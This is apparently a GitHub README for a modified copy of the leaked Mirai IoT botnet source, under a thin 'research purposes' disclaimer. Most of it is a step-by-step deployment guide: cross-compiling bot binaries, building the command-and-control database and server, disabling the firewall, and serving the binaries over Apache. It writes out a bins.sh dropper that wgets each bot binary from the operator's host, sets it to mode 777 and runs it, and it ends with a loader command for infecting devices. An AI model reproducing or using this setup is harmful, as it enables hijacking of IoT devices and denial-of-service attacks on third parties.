# Mirai BotNet to Tashiro(未来砲)
<!--

  ,～（（((((((～～､
  (  ＿（（ (((＿　)
  |/　~^^＼)／^^~ヽ|
  |　　＿　《　＿   |
 (|-(_//_)-(_//_)-|）
  |　　 　厶､　　   |     ／￣￣￣￣￣￣￣￣￣￣￣
  ＼   ||||||||　／　　＜  Mirai BotNet to Tashiro.
    ＼_________／       ＼＿＿＿＿＿＿＿＿＿＿＿

-->
Leaked Linux.Mirai Source Code for Research/IoT Development Purposes

Uploaded for research purposes and so we can develop IoT and such.

Modified from https://github.com/jgamblin/Mirai-Source-Code

I was referring to this for a moment.<br>
https://gist.github.com/ppoffice/86beb0f90de5aeec75aabd517ebc5e43

## Requirements
* To be able to use vi.
* Do not run in WSL.(I tried, but I couldn't use mysql or compile it.)
* It is recommended that Linux be used as the operating system.

## Credits
[Anna-senpai](https://hackforums.net/showthread.php?tid=5420472)

## Disclaimer
This repository is for academic purposes, the use of this software is your
responsibility.

## Warning
The [zip file](https://www.virustotal.com/en/file/f10667215040e87dae62dd48a5405b3b1b0fe7dbbfbf790d5300f3cd54893333/analysis/1477822491/) for this repo is being identified by some AV programs as malware.  Please take caution.

## Install

[日本語(Japanese)](README_ja.md)

※If you are not logged in as root, be sure to add sudo and follow the installation instructions below.<br />
※If you are unable to install the software, please refer to the following URL for installation.<br />
https://programmer.group/mirai-botnet-environment-setup-steps.html <br>
https://github.com/ruCyberPoison/-Mirai-Iot-BotNet/blob/master/TUTORIAL.txt <br>
https://www.youtube.com/watch?v=G4vUp3ydjs0 <br>
https://www.youtube.com/watch?v=nz_6ayGosxo <br>

```
# sudo apt-get install git gcc golang electric-fence mysql-server mysql-client
```
If you are using debian, you cannot install mysql as it is, so please install it in the following way.
```
# wget https://dev.mysql.com/get/mysql-apt-config_0.8.22-1_all.deb
# sudo dpkg -i mysql-apt-config_0.8.22-1_all.deb
# sudo apt update && sudo apt install mysql-server mysql-client
```
After installing the dependency tools, follow the steps below.
```
# git clone https://github.com/ware255/Mirai-Source-Code-plus.git
# cd Mirai-Source-Code-plus/scripts
```
Cross Compile
```
# chmod +x cross-compile.sh
# sudo ./cross-compile.sh
```
Enter "n" here.
```
Install mysql-server and mysql-client (y/n)? n
```
Edit .bashrc
```
# vi ~/.bashrc
```
Add the following string to the last line
```
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin

export GOPATH=$HOME/go
```
After adding and saving, enter the following command
```
# mkdir ~/go
# source ~/.bashrc
```
Get golang requiremnts
```
# go get github.com/go-sql-driver/mysql
# go get github.com/mattn/go-shellwords
```
In mirai folder, run build.sh script
```
# cd ../mirai
# chmod +x build.sh
# ./build.sh release telnet
```
If you have iptbales/ip6tables or any firewall install disable it.
```
# sudo service iptables stop
```
**Database setup** <br>
Add users to mysql.
```
# cd release
# sudo mysql -u root -p
Enter Password: root
> create database mirai;
> use mirai
```
When you are done typing,<br>
```
CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);

CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);

CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);
```
Copy and paste this far into the mysql prompt.<br>
After pressing Enter, type the command below.
```
> INSERT INTO users VALUES (NULL, 'tashiro', 'mystrongestpassword', 0, 0, 0, 0, -1, 1, 30, '');
> exit
# sudo service mysql restart
```
After restarting the mysql server, compile again and go to the release directory and run the compiled file named cnc.
```
# cd ..
# ./build.sh release telnet
# cp prompt.txt release/
# cd release
# sudo ./cnc
```
Next, open a new prompt and telnet to the IP address of the one who compiled the bot.<br>
The following is an example of running the telnet command.
```
# telnet 192.168.19.19
```
OK, well use this user name and password to login in this case the username is : `tashiro` and the password is : `mystrongestpassword`<br><br>
Open a new prompt again and install and start Apache2.
```
# cd ~/Mirai-Source-Code-plus/mirai/release
# sudo apt install apache2
# sudo service apache2 start
```
copy the mirai files at the apache source.
```
# sudo mv mirai.* /var/www/html
```
well we need to delete the index to show the index file directory on browser.
```
# rm -fr /var/www/html/index.html
```
Then open a browser and enter http://localhost or your IP address and see if the file appears.

Go to /var/www/html and create bins.sh.
```
# cd /var/www/html
# touch bins.sh
```
Next, open `bins.sh` and write the following (replace `IP OR HOSTNAME:80` with the vps IP you have or your own IP address).
```
#!/bin/sh

# Edit
WEBSERVER="IP OR HOSTNAME:80"
# Stop editing now 

BINARIES="mirai.arm mirai.m68k miraint.x86 miraint.spc miraint.sh4 miraint.ppc miraint.mpsl miraint.mips miraint.arm7 miraint.arm5n miraint.arm"

for Binary in $BINARIES; do
	wget http://$WEBSERVER/$Binary -O dvrHelper
	chmod 777 dvrHelper
	./dvrHelper
done

rm -f "
```
If you have vps, please upload /var/www/html using sftp.<br />
※If you do not have a vps, you may leave it as is.<br />
Please check by yourself if it really uploaded, I don't know much about vps or anything like that.

Now restart the Apache server.
```
# sudo service apache2 restart
```
Next, to build the loader, go to Mirai-Source-Code-plus/loader/ and build the loader.<br />
※Omit commands to move.
```
# chmod +x build.sh
# ./build.sh
```
and after than type this code but put you filename here --> file.txt before paste
```
# cat file.txt | ./loader wget http://dyn.com
```
This completes the installation. :)<br>
Thank you for your hard work. Take a break and have a cup of coffee or something.

## References

https://github.com/jgamblin/Mirai-Source-Code <br>
https://programmer.group/mirai-botnet-environment-setup-steps.html <br>
https://github.com/ruCyberPoison/-Mirai-Iot-BotNet/blob/master/TUTORIAL.txt <br>
https://www.youtube.com/channel/UCXM4xUOmJk3Px2qiG9x1ygg/videos <br>

The translation in English is DeepL, but there are some funny parts, so please be warm there.
